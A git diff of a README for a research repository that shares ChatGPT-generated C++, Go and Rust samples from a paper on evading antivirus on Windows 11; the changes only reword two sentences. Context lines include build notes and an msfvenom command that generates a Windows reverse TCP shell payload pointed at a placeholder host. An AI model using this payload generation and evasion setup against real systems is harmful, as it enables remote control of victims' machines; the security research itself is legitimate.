@@ -1,7 +1,7 @@
 <!-- ABOUT THE PROJECT -->
 ## About The Project
 
-This project was created to share the code that is mentioned in the following paper with the title, [Bypassing antivirus detection: old-school malware, new tricks](https://arxiv.org/abs/2305.04149). In this repository, we included all relevant C++, Go, Rust, and C++ code that was created by ChatGPT. The purpose of this project was to demonstrate that with simple and common evading techniques, a malicious executable can evade most, if not all, AV solutions. It should be noted that the study focused on Windows 11. So, probably these executables will be working in Windows 10, but I have not tested them.
+This project was created to share the code that is mentioned in the following paper with the title, [Bypassing antivirus detection: old-school malware, new tricks](https://arxiv.org/abs/2305.04149). In this repository, we included all relevant C++, Go, Rust, and C++ code that was created by ChatGPT. The purpose of this project is to demonstrate that with simple and common evading techniques, a malicious executable can evade most, if not all, AV solutions. It should be noted that the study focused on Windows 11. So, probably these executables will be working in Windows 10, but I have not tested them.
 
 
 ### Built With
@@ -48,7 +48,7 @@ import os
 import sys
 os.path.dirname(sys.executable)
 ```
-Go to this directory and find the "site-packages\crypto" folder and rename it to "Crypto". For instance, my path was "C:\Users\user\AppData\Local\Programs\Python\Python310\Lib\site-packages"
+Go to this directory and find the "site-packages\crypto" folder and rename the "crypto" folder into "Crypto". For instance, my path was "C:\Users\user\AppData\Local\Programs\Python\Python310\Lib\site-packages"
 
 ### For Go
 1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f go 
